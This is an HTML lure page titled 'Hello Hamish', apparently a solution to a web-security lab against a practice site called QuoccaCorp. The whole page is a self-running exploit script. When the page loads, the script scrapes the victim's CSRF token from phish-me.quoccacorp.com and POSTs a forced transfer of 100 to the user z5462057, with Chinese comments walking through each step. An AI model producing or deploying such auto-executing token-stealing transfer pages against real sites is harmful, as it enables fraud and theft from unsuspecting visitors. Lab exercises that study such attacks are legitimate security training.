<!DOCTYPE html>
<html>
<head>
    <title>Hello Hamish</title>
</head>
<body>
    <script>
        async function exploit() {
            try {
                // 1. 获取主页内容以提取最新的 CSRF Token
                const response = await fetch('https://phish-me.quoccacorp.com/');
                const html = await response.text();

                // 2. 使用正则匹配提取 token
                const match = html.match(/name="csrf_token" value="([^"]+)"/);
                if (!match) {
                    console.error("Token not found");
                    return;
                }
                const token = match[1];

                // 3. 构造转账请求
                // 注意：转账目标是你的用户名 z5462057
                const details = {
                    'csrf_token': token,
                    'username': 'z5462057',
                    'amount': '100' // 转走 100 元
                };

                // 4. 将对象转换为 URL 编码字符串
                const formBody = Object.keys(details).map(key => 
                    encodeURIComponent(key) + '=' + encodeURIComponent(details[key])
                ).join('&');

                // 5. 发送 POST 请求到 API
                await fetch('https://quoccacorp.com', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: formBody
                });

                console.log("Success! Check your balance.");
            } catch (err) {
                console.error("Error:", err);
            }
        }
        // 自动执行
        exploit();
    </script>
</body>
</html>
